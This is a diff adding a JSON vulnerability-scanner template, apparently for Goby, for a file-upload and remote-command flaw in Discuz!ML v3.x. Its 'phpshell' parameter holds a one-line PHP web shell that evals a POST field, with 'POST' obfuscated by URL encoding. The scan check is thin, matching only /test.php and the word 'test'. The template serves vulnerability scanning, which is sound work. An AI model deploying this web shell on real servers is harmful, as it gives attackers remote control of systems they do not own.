@@ -1,0 +1,75 @@
+{
+  "Name": "Discuz!ML v3.x GETSHELL",
+  "Description": "There is any file upload, arbitrary command execution",
+  "Product": "Discuz!ML",
+  "Homepage": "https://www.discuz.net/",
+  "DisclosureDate": "2021-06-18",
+  "Author": "buzhidao",
+  "GobyQuery": "app=\"Discuz\" && (body=\"MultiLingual version\"||body=\"Multi-Lingual Javascript Support\")",
+  "Level": "3",
+  "Impact": "<p>There is any file upload, any command execution, you can get the server permissions<br></p>",
+  "Recommendation": "<p>Upgrade to the latest version<br></p>",
+  "References": [
+    "https://blog.csdn.net/god_zzZ/article/details/95912088"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "phpshell",
+      "type": "input",
+      "value": "<?php  eval($_%50%4f%53%54[\"zhang\"]);?>"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": [
+    "File Upload",
+    "RCE"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
